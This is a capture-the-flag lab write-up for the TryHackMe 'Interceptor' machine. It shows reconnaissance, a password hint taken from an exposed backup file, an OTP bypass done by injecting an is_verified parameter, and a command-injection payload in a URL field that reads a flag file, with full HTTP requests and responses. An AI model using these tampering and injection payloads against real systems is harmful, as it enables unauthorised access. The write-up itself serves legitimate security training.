# TryHackMe Interceptor Write-up

<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/5dcaa545-3309-42e3-920e-b774cc2baa0d" />

Use Burp or interception knowledge to modify the traffic and pwn the machine.

# Target Information

| IP Address  | Hostname     |
| ----------- | ------------ |
| 10.49.185.8 | mediahub.thm |

---

# Initial Reconnaissance

## Nmap Scan

Started with a service and version detection scan.

```bash
nmap -sC -sV -O mediahub.thm
```

## Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MediaHub
```

## Observations

* SSH service was exposed but no credentials were available.
* DNS was running on port 53.
* Apache hosted the `MediaHub` application.
* PHP session cookies did not use the `HttpOnly` flag.

---

# Web Enumeration

Performed directory enumeration against the web application.

```bash
gobuster dir -u http://mediahub.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,phps
```

## Interesting Endpoints

```text
/login.php            (Status: 200)
/login.php.bak        (Status: 200)
/search.php           (Status: 302)
/logout.php           (Status: 302)
/config.php           (Status: 200)
/uploads              (Status: 301)
/assets               (Status: 301)
/javascript           (Status: 301)
/header.php           (Status: 200)
/footer.php           (Status: 200)
/phpmyadmin           (Status: 301)
/dashboard.php        (Status: 302)
/otp.php              (Status: 302)
```

---

# Login Portal Analysis

## Initial Testing

Tested the login page for common weaknesses:

* Default credentials
* Authentication bypass payloads
* SQL injection

None were successful.

---

# Backup File Disclosure

Discovered an exposed backup file:

```text
/login.php.bak
```

Inspecting the source code revealed developer notes.

```php
<?php
include "header.php";

/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: [REDACTED]
|
| Password policy reminder:
| Admin password follows company format:
| [REDACTED]
|
| TODO: remove before production deployment
*/
?>
```

Using the password format hint successfully revealed valid credentials.

---

# OTP Bypass

After login, the application redirected to:

```text
/otp.php
```

## Notes

* Required a 6-digit OTP.
* No rate limiting or lockout mechanism was implemented.
* Brute force was possible but unnecessary.

The OTP form submitted requests to:

```text
/verify_otp.php
```

---

# Intercepting the OTP Request

Captured the request in Burp Suite.

## Original Request

```http
POST /verify_otp.php HTTP/1.1
Host: mediahub.thm
Cookie: PHPSESSID=5l0gfb6lbqugqasbul7oriiehv
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

otp=213456
```

## Original Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

Observed that the backend returned an `is_verified` field.

Modified the request manually.

---

# OTP Authentication Bypass

## Modified Request

```http
POST /verify_otp.php HTTP/1.1
Host: mediahub.thm
Cookie: PHPSESSID=5l0gfb6lbqugqasbul7oriiehv
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

otp=213456&is_verified=1
```

The server accepted the manipulated parameter and redirected the session to:

```text
/dashboard.php
```

---

# Dashboard Access

After bypassing OTP validation, access to the admin dashboard was obtained.

A flag was displayed at the top of the page:

```text
THM{REDACTED}
```

## Dashboard Features

The dashboard exposed:

* File upload functionality
* Feed import functionality

Testing indicated:

* Weak upload validation
* SSRF functionality
* Possible command injection

---

# SSRF and Command Injection

## Vulnerable Endpoint

```text
/import_feed_api.php
```

The application accepted a URL parameter and internally executed a `curl` command.

---

# Normal Request

Captured a legitimate request.

## Request

```http
POST /import_feed_api.php HTTP/1.1
Host: mediahub.thm
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=5l0gfb6lbqugqasbul7oriiehv
Content-Length: 22

url=http://example.com
```

## Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"ok":false,"error":"Internet not connected","cmd_output":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--     0\ncurl: (28) Connection timed out after 4001 milliseconds\n"}
```

---

# Vulnerability Analysis

Important observations:

* `localhost` and `127.0.0.1` were filtered.
* The endpoint only accepted domain names.
* User input appeared to be passed directly into a shell command.
* Full command output was reflected in the response.

This indicated command injection through the `url` parameter.

---

# Command Injection Exploitation

Crafted a payload using shell command substitution.

## Malicious Request

```http
POST /import_feed_api.php HTTP/1.1
Host: mediahub.thm
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=5l0gfb6lbqugqasbul7oriiehv
Content-Length: 44

url=http://example.com%3b+$(cat+/var/www/user.txt)
```

Decoded payload:

```bash
http://example.com; $(cat /var/www/user.txt)
```

---

# Command Injection Response

## Server Response

```http
HTTP/1.1 200 OK
Date: Sun, 10 May 2026 01:33:08 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: application/json

{"ok":false,"error":"Internet not connected","cmd_output":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--     0\ncurl: (28) Connection timed out after 4001 milliseconds\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: THM{REDACTED}\n"}
```

The contents of `/var/www/user.txt` appeared in the command output.

---

# Vulnerabilities Identified

## Sensitive Backup File Exposure

* Publicly accessible `.bak` file exposed internal developer notes and password patterns.

## Weak Credential Policy

* Predictable password structure enabled credential guessing.

## OTP Authentication Bypass

* Backend trusted client-controlled verification parameters.

## SSRF

* Application performed server-side requests using attacker-controlled URLs.

## Command Injection

* User input was directly passed into a shell command without sanitization.

---

# Attack Path Summary

1. Performed Nmap reconnaissance.
2. Enumerated web directories using FFUF.
3. Found exposed backup file `/login.php.bak`.
4. Recovered developer notes and password policy.
5. Logged in using predictable credentials.
6. Bypassed OTP validation via parameter manipulation.
7. Accessed the dashboard.
8. Identified SSRF and command injection in `/import_feed_api.php`.
9. Exploited command injection to read the user flag.

---
